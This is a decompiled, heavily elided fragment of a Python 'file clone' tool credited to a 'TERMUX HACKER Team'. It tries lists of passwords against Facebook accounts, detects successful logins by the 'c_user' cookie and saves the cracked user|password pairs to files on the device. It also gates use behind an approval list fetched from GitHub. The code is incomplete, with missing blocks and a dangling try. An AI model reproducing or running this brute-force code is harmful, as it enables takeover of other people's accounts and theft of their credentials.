# Decompile by MEHEDI FILE CLONE 
# Time Succes decompile : 2023-11-05 13:46:22.007545
...
==================================================
           CODED BY : TERMUX HACKER Team 2.0
           WHATSAPP : +8801745339171  
            FB id :  Md Mehedi 
==================================================           
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/mehedi71344/BEST-FILE-CLONE/main/Approved.txt').text
    if to in r:
        time.sleep(2)
        python_java()
    else:
...
def reg2():
    ...
    os.system("xdg-open https://wa.me/+8801745339171")
...
def MEHEDI(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;92m SUCCESSFULL : %s --- \033[1;97m/sdcard/SAJJAD-OK.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;92m CHECKPOINTS : %s --- \033[1;97m/sdcard/SAJJAD-CP.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
class __xyz__:
    ...
    def __metode__(self, user, __chi__, chachaji):
        global ok,cp,loop
        sys.stdout.write(f'\r [THE MEHEDI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                das = {
                    ...
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://www.facebook.com/md.mehidehasan.96343/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":chachaji,
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s \033[1;94m[MEHEDI-CP] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/MEHEDI-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
